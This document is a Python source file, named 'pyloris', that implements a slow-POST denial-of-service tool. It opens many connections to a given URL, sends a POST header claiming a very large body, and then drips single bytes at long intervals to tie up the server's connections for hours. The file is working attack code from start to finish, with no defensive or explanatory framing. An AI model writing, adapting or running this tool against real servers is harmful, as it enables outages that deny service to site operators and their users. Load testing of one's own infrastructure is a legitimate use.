import argparse
import asyncio
import datetime
import logging
import socket
import ssl
import struct
import urllib.parse


async def main():
    logging.basicConfig(level=logging.INFO)

    args = parse_args()
    logging.info("URL=%s", args.url.geturl())
    logging.info("ContentLength=%s", args.content_length)

    host, port = get_hostport(args.url)
    logging.info("host=%s", host)
    logging.info("port=%s", port)

    reqhead = get_reqhead(args.url, host, args.content_length)
    logging.info("reqhead=%s", reqhead)

    dial_workers_launch_interval = args.rampup_interval / args.dial_workers_count
    logging.info("dial_workers_count=%s", dial_workers_launch_interval.total_seconds())

    active_conn_q = asyncio.Queue(maxsize=args.dial_workers_count)
    logging.info("active_conn_q=%s", active_conn_q)

    asyncio.create_task(active_conn_counter(active_conn_q))
    logging.info("CreatedTask=%s", active_conn_counter)

    for _ in range(args.dial_workers_count):
        asyncio.create_task(dial_worker(active_conn_q, host, port, args, reqhead))
        await asyncio.sleep(dial_workers_launch_interval.total_seconds())
    await asyncio.sleep(args.duration.total_seconds())


def parse_args():
    p = argparse.ArgumentParser("pyloris")
    p.add_argument("url", type=arg_url_type)
    p.add_argument("-l", "--content_length", type=int, default=1000_000)
    p.add_argument("--dial_workers_count", type=int, default=10)
    p.add_argument("--rampup_interval", default=datetime.timedelta(seconds=1))
    p.add_argument("-d", "--duration", default=datetime.timedelta(hours=1))
    p.add_argument("-s", "--sleep_interval", default=datetime.timedelta(seconds=10))
    return p.parse_args()


def arg_url_type(s):
    pd = urllib.parse.urlparse(s)
    if (pd.scheme not in ("http", "https")) or (not pd.netloc):
        raise argparse.ArgumentTypeError()
    return pd


def get_hostport(url):
    p = url.port
    return url.hostname, p or 443 if url.scheme == "https" else 80


def get_reqhead(url, host, content_length):
    return (
        f"POST {url.path} HTTP/1.1\n"
        f"Host: {host}\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Content-Length: {content_length}\n\n"
    ).encode("utf-8")


async def active_conn_counter(q):
    n = 0
    while True:
        d = await q.get()
        n += d
        logging.info("ConnectionsHolding=%s", n)


async def dial_worker(q, host, port, args, rhead):
    istls = args.url.scheme == "https"
    while True:
        await asyncio.sleep(args.rampup_interval.total_seconds())
        conn = await dial_target(host, port, istls)
        if conn:
            asyncio.create_task(do_lor(conn, q, args, rhead))


async def dial_target(host, port, istls):
    try:
        conn = socket.create_connection((host, port))
    except OSError:
        logging.error("Create connection")
        return None

    conn.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 128)
    conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 128)
    conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))

    if istls:
        ctx = ssl.create_default_context()
        try:
            return ctx.wrap_socket(conn, server_hostname=host)
        except (ssl.SSLError, OSError):
            logging.error("Wrap connection")
            conn.close()
            return None

    return conn


shared_rbuf = bytes(4096)
shared_wbuf = b"A"


async def do_lor(conn, q, args, rhead):
    try:
        conn.sendall(rhead)
    except OSError:
        logging.error("Send H")

    await q.put(1)

    sleep_interval_s = args.sleep_interval.total_seconds()
    for _ in range(args.content_length):
        await asyncio.sleep(sleep_interval_s)
        try:
            conn.sendall(shared_wbuf)
        except OSError:
            logging.error("Send A")

    conn.close()


if "__main__" == __name__:
    asyncio.run(main())
